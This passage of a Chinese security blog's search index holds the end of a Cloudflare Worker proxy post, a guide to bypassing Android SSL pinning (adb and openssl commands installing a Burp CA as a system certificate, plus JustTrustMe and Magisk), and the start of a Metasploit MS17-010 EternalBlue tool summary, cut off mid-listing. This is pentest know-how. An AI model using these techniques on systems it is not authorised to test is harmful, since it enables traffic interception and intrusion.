class=\"keyword\">case</span> <span class=\"string\">&#x27;/works&#x27;</span>:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> makeRes(<span class=\"string\">&#x27;it works&#x27;</span>)</span><br><span class=\"line\">  <span class=\"keyword\">default</span>:</span><br><span class=\"line\">    <span class=\"comment\">// static files</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> fetch(ASSET_URL + path)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;Request&#125;</span> <span class=\"variable\">req</span></span></span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;string&#125;</span> <span class=\"variable\">pathname</span></span></span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">httpHandler</span>(<span class=\"params\">req, pathname</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> reqHdrRaw = req.headers</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (reqHdrRaw.has(<span class=\"string\">&#x27;x-jsproxy&#x27;</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Response.error()</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// preflight</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (req.method === <span class=\"string\">&#x27;OPTIONS&#x27;</span> &amp;&amp;</span><br><span class=\"line\">      reqHdrRaw.has(<span class=\"string\">&#x27;access-control-request-headers&#x27;</span>)</span><br><span class=\"line\">  ) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> Response(<span class=\"literal\">null</span>, PREFLIGHT_INIT)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> acehOld = <span class=\"literal\">false</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> rawSvr = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> rawLen = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">  <span class=\"keyword\">let</span> rawEtag = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">const</span> reqHdrNew = <span class=\"keyword\">new</span> Headers(reqHdrRaw)</span><br><span class=\"line\">  reqHdrNew.set(<span class=\"string\">&#x27;x-jsproxy&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 此处逻辑和 http-dec-req-hdr.lua 大致相同</span></span><br><span class=\"line\">  <span class=\"comment\">// https://github.com/EtherDream/jsproxy/blob/master/lua/http-dec-req-hdr.lua</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> refer = reqHdrNew.get(<span class=\"string\">&#x27;referer&#x27;</span>)</span><br><span class=\"line\">  <span class=\"keyword\">const</span> query = refer.substr(refer.indexOf(<span class=\"string\">&#x27;?&#x27;</span>) + <span class=\"number\">1</span>)</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!query) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> makeRes(<span class=\"string\">&#x27;missing params&#x27;</span>, <span class=\"number\">403</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> param = <span class=\"keyword\">new</span> URLSearchParams(query)</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">const</span> [k, v] <span class=\"keyword\">of</span> <span class=\"built_in\">Object</span>.entries(param)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (k.substr(<span class=\"number\">0</span>, <span class=\"number\">2</span>) === <span class=\"string\">&#x27;--&#x27;</span>) &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 系统信息</span></span><br><span class=\"line\">      <span class=\"keyword\">switch</span> (k.substr(<span class=\"number\">2</span>)) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;aceh&#x27;</span>:</span><br><span class=\"line\">        acehOld = <span class=\"literal\">true</span></span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;raw-info&#x27;</span>:</span><br><span class=\"line\">        [rawSvr, rawLen, rawEtag] = v.split(<span class=\"string\">&#x27;|&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 还原 HTTP 请求头</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (v) &#123;</span><br><span class=\"line\">        reqHdrNew.set(k, v)</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        reqHdrNew.delete(k)</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!param.has(<span class=\"string\">&#x27;referer&#x27;</span>)) &#123;</span><br><span class=\"line\">    reqHdrNew.delete(<span class=\"string\">&#x27;referer&#x27;</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// cfworker 会把路径中的 `//` 合并成 `/`</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> urlStr = pathname.replace(<span class=\"regexp\">/^(https?):\\/+/</span>, <span class=\"string\">&#x27;$1://&#x27;</span>)</span><br><span class=\"line\">  <span class=\"keyword\">const</span> urlObj = newUrl(urlStr)</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!urlObj) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> makeRes(<span class=\"string\">&#x27;invalid proxy url: &#x27;</span> + urlStr, <span class=\"number\">403</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/** <span class=\"doctag\">@type <span class=\"type\">&#123;RequestInit&#125;</span> </span>*/</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> reqInit = &#123;</span><br><span class=\"line\">    method: req.method,</span><br><span class=\"line\">    headers: reqHdrNew,</span><br><span class=\"line\">    redirect: <span class=\"string\">&#x27;manual&#x27;</span>,</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (req.method === <span class=\"string\">&#x27;POST&#x27;</span>) &#123;</span><br><span class=\"line\">    reqInit.body = req.body</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> proxy(urlObj, reqInit, acehOld, rawLen, <span class=\"number\">0</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * </span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;URL&#125;</span> </span>urlObj </span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;RequestInit&#125;</span> </span>reqInit </span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;number&#125;</span> </span>retryTimes </span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">proxy</span>(<span class=\"params\">urlObj, reqInit, acehOld, rawLen, retryTimes</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = <span class=\"keyword\">await</span> fetch(urlObj.href, reqInit)</span><br><span class=\"line\">  <span class=\"keyword\">const</span> resHdrOld = res.headers</span><br><span class=\"line\">  <span class=\"keyword\">const</span> resHdrNew = <span class=\"keyword\">new</span> Headers(resHdrOld)</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> expose = <span class=\"string\">&#x27;*&#x27;</span></span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">const</span> [k, v] <span class=\"keyword\">of</span> resHdrOld.entries()) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (k === <span class=\"string\">&#x27;access-control-allow-origin&#x27;</span> ||</span><br><span class=\"line\">        k === <span class=\"string\">&#x27;access-control-expose-headers&#x27;</span> ||</span><br><span class=\"line\">        k === <span class=\"string\">&#x27;location&#x27;</span> ||</span><br><span class=\"line\">        k === <span class=\"string\">&#x27;set-cookie&#x27;</span></span><br><span class=\"line\">    ) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">const</span> x = <span class=\"string\">&#x27;--&#x27;</span> + k</span><br><span class=\"line\">      resHdrNew.set(x, v)</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (acehOld) &#123;</span><br><span class=\"line\">        expose = expose + <span class=\"string\">&#x27;,&#x27;</span> + x</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      resHdrNew.delete(k)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (acehOld &amp;&amp;</span><br><span class=\"line\">      k !== <span class=\"string\">&#x27;cache-control&#x27;</span> &amp;&amp;</span><br><span class=\"line\">      k !== <span class=\"string\">&#x27;content-language&#x27;</span> &amp;&amp;</span><br><span class=\"line\">      k !== <span class=\"string\">&#x27;content-type&#x27;</span> &amp;&amp;</span><br><span class=\"line\">      k !== <span class=\"string\">&#x27;expires&#x27;</span> &amp;&amp;</span><br><span class=\"line\">      k !== <span class=\"string\">&#x27;last-modified&#x27;</span> &amp;&amp;</span><br><span class=\"line\">      k !== <span class=\"string\">&#x27;pragma&#x27;</span></span><br><span class=\"line\">    ) &#123;</span><br><span class=\"line\">      expose = expose + <span class=\"string\">&#x27;,&#x27;</span> + k</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (acehOld) &#123;</span><br><span class=\"line\">    expose = expose + <span class=\"string\">&#x27;,--s&#x27;</span></span><br><span class=\"line\">    resHdrNew.set(<span class=\"string\">&#x27;--t&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// verify</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (rawLen) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> newLen = resHdrOld.get(<span class=\"string\">&#x27;content-length&#x27;</span>) || <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> badLen = (rawLen !== newLen)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (badLen) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (retryTimes &lt; MAX_RETRY) &#123;</span><br><span class=\"line\">        urlObj = <span class=\"keyword\">await</span> parseYtVideoRedir(urlObj, newLen, res)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (urlObj) &#123;</span><br><span class=\"line\">          <span class=\"keyword\">return</span> proxy(urlObj, reqInit, acehOld, rawLen, retryTimes + <span class=\"number\">1</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> makeRes(res.body, <span class=\"number\">400</span>, &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;--error&#x27;</span>: <span class=\"string\">`bad len: <span class=\"subst\">$&#123;newLen&#125;</span>, except: <span class=\"subst\">$&#123;rawLen&#125;</span>`</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;access-control-expose-headers&#x27;</span>: <span class=\"string\">&#x27;--error&#x27;</span>,</span><br><span class=\"line\">      &#125;)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (retryTimes &gt; <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">      resHdrNew.set(<span class=\"string\">&#x27;--retry&#x27;</span>, retryTimes)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> status = res.status</span><br><span class=\"line\"></span><br><span class=\"line\">  resHdrNew.set(<span class=\"string\">&#x27;access-control-expose-headers&#x27;</span>, expose)</span><br><span class=\"line\">  resHdrNew.set(<span class=\"string\">&#x27;access-control-allow-origin&#x27;</span>, <span class=\"string\">&#x27;*&#x27;</span>)</span><br><span class=\"line\">  resHdrNew.set(<span class=\"string\">&#x27;--s&#x27;</span>, status)</span><br><span class=\"line\">  resHdrNew.set(<span class=\"string\">&#x27;--ver&#x27;</span>, JS_VER)</span><br><span class=\"line\"></span><br><span class=\"line\">  resHdrNew.delete(<span class=\"string\">&#x27;content-security-policy&#x27;</span>)</span><br><span class=\"line\">  resHdrNew.delete(<span class=\"string\">&#x27;content-security-policy-report-only&#x27;</span>)</span><br><span class=\"line\">  resHdrNew.delete(<span class=\"string\">&#x27;clear-site-data&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (status === <span class=\"number\">301</span> ||</span><br><span class=\"line\">      status === <span class=\"number\">302</span> ||</span><br><span class=\"line\">      status === <span class=\"number\">303</span> ||</span><br><span class=\"line\">      status === <span class=\"number\">307</span> ||</span><br><span class=\"line\">      status === <span class=\"number\">308</span></span><br><span class=\"line\">  ) &#123;</span><br><span class=\"line\">    status = status + <span class=\"number\">10</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> Response(res.body, &#123;</span><br><span class=\"line\">    status,</span><br><span class=\"line\">    headers: resHdrNew,</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;URL&#125;</span> </span>urlObj </span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isYtUrl</span>(<span class=\"params\">urlObj</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    urlObj.host.endsWith(<span class=\"string\">&#x27;.googlevideo.com&#x27;</span>) &amp;&amp;</span><br><span class=\"line\">    urlObj.pathname.startsWith(<span class=\"string\">&#x27;/videoplayback&#x27;</span>)</span><br><span class=\"line\">  )</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;URL&#125;</span> </span>urlObj </span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;number&#125;</span> </span>newLen </span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;Response&#125;</span> </span>res </span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">parseYtVideoRedir</span>(<span class=\"params\">urlObj, newLen, res</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (newLen &gt; <span class=\"number\">2000</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!isYtUrl(urlObj)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> data = <span class=\"keyword\">await</span> res.text()</span><br><span class=\"line\">    urlObj = <span class=\"keyword\">new</span> URL(data)</span><br><span class=\"line\">  &#125; <span class=\"keyword\">catch</span> (err) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!isYtUrl(urlObj)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> urlObj</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>点击deploy后，会生成一个worker.dev的域名</p>\n<h1 id=\"0x02-设置域名\"><a href=\"#0x02-设置域名\" class=\"headerlink\" title=\"0x02 设置域名\"></a>0x02 设置域名</h1><p>设置ns解析，将自己的域名ns解析到cloudflare提供的域名上，即可完成</p>\n<p>该种方式其实还可以直接代理一些其他网站，比如google，youtube等等，只需要修改代理网址即可。</p>\n","categories":["杂文"],"tags":["cdn"]},{"title":"bypass android ssl pinning","url":"http://blog.le31ei.top/2020/08/19/bypass-android-ssl-pinning/","content":"<p>在做app测试的时候，经常有抓不到包的情况，即使是导入了burp证书后，仍然无法抓取https的数据包，这种情况一般是遇到了ssl pinning。</p>\n<h1 id=\"0x01-替换系统证书\"><a href=\"#0x01-替换系统证书\" class=\"headerlink\" title=\"0x01 替换系统证书\"></a>0x01 替换系统证书</h1><p>在android 7.0以前，系统导入burp证书为用户权限能够绕过部分未做证书校验的APP，但是7.0及以后应用默认不再信任用户证书，导入burp证书后仍然会提示证书错误，抓不到https的包。</p>\n<p>这种情况下一般采用替换系统证书的方法，原理是将burp的证书直接导入为系统证书，前提是手机需要ROOT权限。导入后系统会把burp当成系统证书，自然就能中间人代理https流量了。</p>\n<p>具体步骤如下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 下载burp证书，导出为cacert.der，然后转换为pem格式</span></span><br><span class=\"line\">openssl x509 -inform DER -outform PEM -in cacert.der -out cacert.pem</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 生成<span class=\"built_in\">hash</span>，得到一个<span class=\"built_in\">hash</span>  比如：9a5ba575</span></span><br><span class=\"line\">openssl x509 -subject_hash_old -in cacert.pem</span><br><span class=\"line\">mv cacert.pem 9a5ba575.0</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 上传为系统证书</span></span><br><span class=\"line\">adb push 9a5ba575.0 /system/etc/security/cacerts/</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 如果在push过程中显示<span class=\"built_in\">readonly</span> system，则需要remount</span></span><br><span class=\"line\">adb disable-verity</span><br><span class=\"line\">adb root</span><br><span class=\"line\">adb remount</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>系统证书的目录是：/system/etc/security/cacerts/ 每个证书的命名规则为：. Certificate_Hash 表示证书文件的 hash 值，Number 是为了防止证书文件的 hash 值一致而增加的后缀; 证书的 hash 值可以由命令计算出来，在终端输入 openssl x509 -subject_hash_old -in ，其中 Certificate_File 为证书路径，将证书重命名为 hash.0 放入系统证书目录，之后你就可以正常抓包了。</p>\n</blockquote>\n<h1 id=\"0x02-Magisk-Always-Trust-User\"><a href=\"#0x02-Magisk-Always-Trust-User\" class=\"headerlink\" title=\"0x02 Magisk+Always Trust User\"></a>0x02 Magisk+Always Trust User</h1><p>上述应用不认用户证书的解决方案还有一种，就是magisk加上<a href=\"https://github.com/NVISO-BE/MagiskTrustUserCerts\">MagiskTrustUserCerts</a>。magisk类似于xposed框架，能够hook系统函数，<code>AlwaysTrustUserCerts</code>是该工具的一个插件，能够将用户导入的证书变成系统证书。</p>\n<p><img src=\"/2020/08/19/bypass-android-ssl-pinning/image-20200820102936183.png\" alt=\"image-20200820102936183.png\"></p>\n<p>在安装好后，进行正常的证书导入操作，证书就能直接导入到系统证书里边，较第一种方式方便许多。</p>\n<p>该种方式可以通过recovery将Magisk刷入未root的系统中，可以绕过一些检测了root权限的应用。</p>\n<h1 id=\"0x03-JustTrustMe\"><a href=\"#0x03-JustTrustMe\" class=\"headerlink\" title=\"0x03 JustTrustMe\"></a>0x03 JustTrustMe</h1><p>在经过上述两种方法后，大部分的app都能抓到包了，但是还是能碰到少数情况仍然抓不到包，应用连不上网的情况。这种情况一般都是ssl pinning的场景。</p>\n<p>应用中的代码对ssl证书进行了锁定。一般这种方法的思路就是通过xposed或者frida等hook框架对相应的证书验证代码hook进行绕过。一般app通常采用通用的解决方案，而xposed框架的JustTrustMe模块基本覆盖了这些类型，故本文不再探讨基于frida的自定义hook函数。</p>\n<p><strong>安装</strong>：</p>\n<p>安装方式比较简单，直接下载apk模块文件<a href=\"https://github.com/Fuzion24/JustTrustMe\">JustTrustMe</a>，按照通用的apk文件安装方式。然后在Xposed框架中进行激活，然后重启生效。</p>\n<p><img src=\"/2020/08/19/bypass-android-ssl-pinning/image-20200820104447189.png\" alt=\"image-20200820104447189\"></p>\n<p>安装好后，再抓包，应用就能正常运行并抓取https数据包了。</p>\n<h1 id=\"0x04-刷机\"><a href=\"#0x04-刷机\" class=\"headerlink\" title=\"0x04 刷机\"></a>0x04 刷机</h1><p>在进行上述步骤操作时会碰到一些刷机问题，这里简单记录一下。</p>\n<p><strong>BL锁</strong>：现在的手机一般有BL锁（BootLoader锁），如果需要刷入第三方recovery或者第三方ROM</p>\n<p><strong>FastBoot</strong>：线刷时需要进入的模式，通过fastboot命令可以刷入recovery。</p>\n<p>fastboot刷入的命令如下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 查看设备</span></span><br><span class=\"line\">fastboot devices</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 刷入recovery</span></span><br><span class=\"line\">fastboot flash recovery recovery.img</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 从新的boot启动</span></span><br><span class=\"line\">fastboot boot recovery.img</span><br></pre></td></tr></table></figure>\n\n<p>附件是windows版本的fastboot工具：<a href=\"./fastboot.exe\">fastboot.exe</a></p>\n<p><strong>TWRP</strong>：第三方recovery，相对于官方的recovery增加了很多功能，可通过该recovery进行卡刷升级等。可刷入xposed框架、Magisk框架等</p>\n<h1 id=\"0x05-流量代理\"><a href=\"#0x05-流量代理\" class=\"headerlink\" title=\"0x05 流量代理\"></a>0x05 流量代理</h1><p>在做了以上操作后仍然有一种情况抓不到流量，就是应用不走配置代理。这种情况的解决思路是需要一个全局的代理工具，如内网渗透用到的proxychains或者proxifier，让所有的流量走统一的代理，然后使用burp抓包。因为默认的burp只能代理http流量，无法代理sock5，所以需要用到一个app工具：<a href=\"./Drony_100.apk\">drony.apk</a></p>\n<p>通过该工具可以配置代理流量，直接将手机的所有流量全局代理到burp上，这样就能抓包了。</p>\n<p>具体使用方法比较简单，可自行搜索查询，不再赘述。</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><ol>\n<li><p><a href=\"https://zhuanlan.zhihu.com/p/127847550\">Android应用中https SSL pinning以及绕过的方法介绍</a></p>\n</li>\n<li><p><a href=\"https://www.mcafee.com/enterprise/en-us/assets/misc/ms-android-7-10-ssl-pinning-bypass.pdf\">Android SSL Pinning Bypass: Android 7-10</a></p>\n</li>\n<li><p><a href=\"https://github.com/Fuzion24/JustTrustMe\">JustTrustMe</a></p>\n</li>\n<li><p><a href=\"https://xz.aliyun.com/t/2440\">SSL Pinning Practice</a></p>\n</li>\n<li><p><a href=\"https://xz.aliyun.com/t/2336\">Frida.Android.Practice (ssl unpinning)</a></p>\n</li>\n</ol>\n","categories":["Pentest"],"tags":["app测试"]},{"title":"ms17010工具总结","url":"http://blog.le31ei.top/2020/08/18/ms17010工具总结/","content":"<p>本文记录下实战中用到的ms17010的利用工具，实战中用过众多工具，都是哪个能成功就用哪个，还未做系统总结。本文记录下使用记录，做个总结备忘。</p>\n<h1 id=\"0x01-msf\"><a href=\"#0x01-msf\" class=\"headerlink\" title=\"0x01 msf\"></a>0x01 msf</h1><p>第一个工具当属大家熟悉<code>ms17_010_eternalblue</code>工具，集成在msf当中。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf5 &gt; search 17-010</span><br><span class=\"line\"></span><br><span class=\"line\">Matching Modules</span><br><span class=\"line\">================</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"comment\">#  Name                                           Disclosure Date  Rank     Check  Description</span></span><br><span class=\"line\">   -  ----                                           ---------------  ----     -----  -----------</span><br><span class=\"line\">   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class=\"line\">   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection</span><br><span class=\"line\">   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class=\"line\">   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption <span class=\"keyword\">for</span> Win8+</span><br><span class=\"line\">   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class=\"line\">   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>其中<code>smb_doublepulsar_rce</code>工具是使用nsa利用工具后留下的后门，可以用此工具反弹meterpreter。一般在内网中优先使用<code>auxiliary/scanner/smb/smb_ms17_010</code>扫描漏洞是否存在后再利用工具进行攻击。</p>\n<p>使用如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class=\"line\">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show options </span><br><span class=\"line\"></span><br><span class=\"line\">Module options 